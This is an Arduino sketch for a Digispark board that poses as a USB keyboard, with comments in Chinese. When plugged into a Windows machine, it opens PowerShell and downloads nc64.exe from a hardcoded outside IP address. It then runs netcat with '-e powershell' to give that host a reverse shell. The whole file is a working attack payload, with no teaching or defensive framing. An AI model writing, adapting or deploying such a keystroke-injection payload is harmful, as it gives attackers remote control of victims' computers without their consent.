#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // 打開運行對話框
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // 輸入 powershell
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(3000);  // 增加延遲以確保命令完整輸入
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // 輸入下載命令，將命令拆分以避免遺漏
  //DigiKeyboard.print("(New-Object Net.WebClient).DownloadFile('http://1.174.222.39:8000/nc64.exe','$env:TEMP/nc64.exe');"); 偶爾會出現請求例外狀況
  DigiKeyboard.print("Invoke-WebRequest -Uri 'http://1.174.228.253:8000/nc64.exe'");
  DigiKeyboard.delay(1000);  // 延遲確保命令分段完整輸入
  DigiKeyboard.print(" -OutFile \"$env:TEMP\\nc64.exe\"");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // 切換到 Temp 目錄
  DigiKeyboard.print("Set-Location $env:TEMP");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // 執行 nc64.exe 反向連線命令
  DigiKeyboard.print(".\\nc64.exe 1.174.228.253 9000 -e powershell");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // 防止腳本再次執行
  for (;;) {
  }
}
